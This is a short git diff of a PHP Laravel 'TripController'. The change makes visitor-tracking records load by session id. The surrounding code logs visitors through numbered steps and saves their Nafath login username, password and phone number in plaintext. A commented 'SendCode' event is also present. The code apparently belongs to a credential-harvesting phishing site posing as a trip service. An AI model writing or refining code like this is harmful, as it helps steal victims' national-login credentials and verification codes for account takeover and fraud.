@@ -301,8 +301,7 @@ class TripController extends Controller
 
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
-
-                $not  = VisitorNotifications::first();
+                $not  = VisitorNotifications::find($visitor->id);
                 $not->update(['page' => 'دخل لصفحة معلومات نفاذ','step_number'=>10]);
                 session()->put('visitor', json_encode($not));
                 // event(new SendCode($not));
@@ -335,7 +334,7 @@ class TripController extends Controller
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
 
-                $not  = VisitorNotifications::first();
+                $not  = VisitorNotifications::find($visitor->id);
                 $not->update(['page' => 'دخل لصفحة معلومات نفاذ','step_number'=>10]);
                 session()->put('visitor', json_encode($not));
                 // event(new SendCode($not));
@@ -353,7 +352,7 @@ class TripController extends Controller
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
 
-                $not  = VisitorNotifications::first();
+                $not  = VisitorNotifications::find($visitor->id);
                 if($request->has('username'))
                 {
                     $not->update(['page' => 'أرسل اسم المستخدم وكلمة السر الخاص بنفاذ','step_number'=>11,'nafad_id'=>$request->phone ?? null,'nafad_username'=>$request->username,'nafad_password'=>$request->password]);
